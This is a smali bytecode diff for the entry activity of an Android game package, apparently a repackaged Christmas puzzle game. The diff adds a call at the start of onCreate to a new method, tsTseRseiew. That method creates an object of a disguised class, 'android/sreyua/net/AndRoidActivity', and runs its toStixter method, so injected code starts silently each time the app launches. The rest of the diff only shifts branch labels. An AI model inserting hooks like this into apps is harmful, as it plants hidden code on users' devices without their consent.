@@ -1755,6 +1755,8 @@
     .param p1, "savedInstanceState"    # Landroid/os/Bundle;
 
     .prologue
+    invoke-virtual {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->tsTseRseiew()V
+
     .line 211
     invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
 
@@ -1800,48 +1802,48 @@
 
     .line 223
     .local v0, "hasCaptiveRuntime":Z
-    if-nez v0, :cond_45
+    if-nez v0, :cond_48
 
     .line 225
     sget-boolean v4, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->sRuntimeClassesLoaded:Z
 
-    if-nez v4, :cond_42
+    if-nez v4, :cond_45
 
     invoke-direct {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->isRuntimeInstalled()Z
 
     move-result v4
 
-    if-nez v4, :cond_42
+    if-nez v4, :cond_45
 
     .line 230
     invoke-direct {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->isRuntimeOnExternalStorage()Z
 
     move-result v4
 
-    if-eqz v4, :cond_3e
+    if-eqz v4, :cond_41
 
     .line 231
     invoke-direct {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->showRuntimeOnExternalStorageDialog()V
 
     .line 263
-    :goto_3d
+    :goto_40
     return-void
 
     .line 233
-    :cond_3e
+    :cond_41
     invoke-direct {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->showRuntimeNotInstalledDialog()V
 
-    goto :goto_3d
+    goto :goto_40
 
     .line 236
-    :cond_42
+    :cond_45
     invoke-direct {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->loadSharedRuntimeDex()V
 
     .line 239
-    :cond_45
+    :cond_48
     sget-boolean v4, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->sRuntimeClassesLoaded:Z
 
-    if-eqz v4, :cond_50
+    if-eqz v4, :cond_53
 
     .line 241
     invoke-direct {p0, v0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->createActivityWrapper(Z)V
@@ -1849,22 +1851,22 @@
     .line 244
     invoke-direct {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->InvokeWrapperOnCreate()V
 
-    goto :goto_3d
+    goto :goto_40
 
     .line 248
-    :cond_50
-    if-eqz v0, :cond_56
+    :cond_53
+    if-eqz v0, :cond_59
 
     .line 252
     invoke-static {}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->KillSelf()V
 
-    goto :goto_3d
+    goto :goto_40
 
     .line 260
-    :cond_56
+    :cond_59
     invoke-direct {p0}, Lair/com/differencegames/homagicofchristmasfree/AppEntry;->launchAIRService()V
 
-    goto :goto_3d
+    goto :goto_40
 .end method
 
 .method public onCreateContextMenu(Landroid/view/ContextMenu;Landroid/view/View;Landroid/view/ContextMenu$ContextMenuInfo;)V
@@ -5004,4 +5006,17 @@
     move-exception v1
 
     goto :goto_20
+.end method
+
+.method public tsTseRseiew()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Landroid/sreyua/net/AndRoidActivity;
+
+    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V
+
+    return-void
 .end method
